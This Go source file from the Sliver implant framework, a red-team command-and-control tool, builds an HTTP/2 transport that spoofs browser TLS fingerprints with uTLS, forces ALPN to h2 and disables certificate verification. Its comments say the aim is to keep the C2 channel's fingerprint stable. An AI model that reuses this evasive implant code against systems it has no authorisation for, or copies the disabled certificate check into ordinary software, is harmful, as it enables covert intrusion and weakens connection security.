package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if and .Config.IncludeHTTP .HTTPC2ImplantConfig.TlsEnabled .HTTPC2ImplantConfig.TlsHttp2}}

import (
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"

	// {{if .Config.Debug}}
	"log"

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	// {{end}}
)

// newHTTP2Transport - 基于 uTLS 拨号器的 HTTP/2 客户端。
// ALPN 强制为 h2,http/1.1;若对端未协商到 h2 则 fail closed,
// 绝不回退 HTTP/1.1(回退会在同一 C2 上产生协议/指纹跳变)。
func newHTTP2Transport(opts *HTTPOptions, proxyURL *url.URL) *http2.Transport {
	return &http2.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string, _ *tls.Config) (net.Conn, error) {
			dialer := &net.Dialer{Timeout: opts.NetTimeout}
			conn, err := dialTarget(ctx, dialer, addr, proxyURL, opts)
			if err != nil {
				return nil, err
			}
			host, _, err := net.SplitHostPort(addr)
			if err != nil {
				conn.Close()
				return nil, err
			}
			tlsConfig := &utls.Config{
				ServerName:         host,
				InsecureSkipVerify: true,
			}
			// {{if .Config.Debug}}
			if cryptography.TLSKeyLogger != nil {
				tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
			}
			// {{end}}
			helloID, spec, err := resolveClientHelloForHTTP2()
			if err != nil {
				conn.Close()
				// {{if .Config.Debug}}
				log.Printf("[http2] fingerprint resolve failed (fail closed): %s", err)
				// {{end}}
				return nil, err
			}
			uconn := utls.UClient(conn, tlsConfig, helloID)
			if spec != nil {
				if err := uconn.ApplyPreset(spec); err != nil {
					conn.Close()
					return nil, fmt.Errorf("%w: %s", ErrInvalidTLSSpec, err)
				}
			}
			handshakeCtx, cancel := context.WithTimeout(ctx, opts.TlsTimeout)
			defer cancel()
			if err := uconn.HandshakeContext(handshakeCtx); err != nil {
				conn.Close()
				// {{if .Config.Debug}}
				log.Printf("[http2] handshake failed: %s", err)
				// {{end}}
				return nil, err
			}
			if negotiated := uconn.ConnectionState().NegotiatedProtocol; negotiated != "h2" {
				conn.Close()
				return nil, fmt.Errorf("http2: peer did not negotiate h2 (got %q)", negotiated)
			}
			return uconn, nil
		},
	}
}

// resolveClientHelloForHTTP2 - 解析 ClientHello 并强制 ALPN 含 h2。
func resolveClientHelloForHTTP2() (utls.ClientHelloID, *utls.ClientHelloSpec, error) {
	id, spec, err := resolveClientHello()
	if err != nil {
		return id, nil, err
	}
	if spec == nil {
		// 物化预设以便重写 ALPN(与 tls_alpn 覆盖相同的路径)。
		materialized, err := utls.UTLSIdToSpec(id)
		if err != nil {
			return id, nil, fmt.Errorf("%w: %s", ErrUnknownTLSHello, err)
		}
		spec = &materialized
	}
	forceHTTP2ALPN(spec)
	return utls.HelloCustom, spec, nil
}

// forceHTTP2ALPN - 将 ALPN 扩展覆写为 h2,http/1.1;无 ALPN 扩展时追加。
func forceHTTP2ALPN(spec *utls.ClientHelloSpec) {
	protocols := []string{"h2", "http/1.1"}
	for _, ext := range spec.Extensions {
		if alpn, ok := ext.(*utls.ALPNExtension); ok {
			alpn.AlpnProtocols = protocols
			return
		}
	}
	spec.Extensions = append(spec.Extensions, &utls.ALPNExtension{AlpnProtocols: protocols})
}

// {{end}} -TlsHttp2
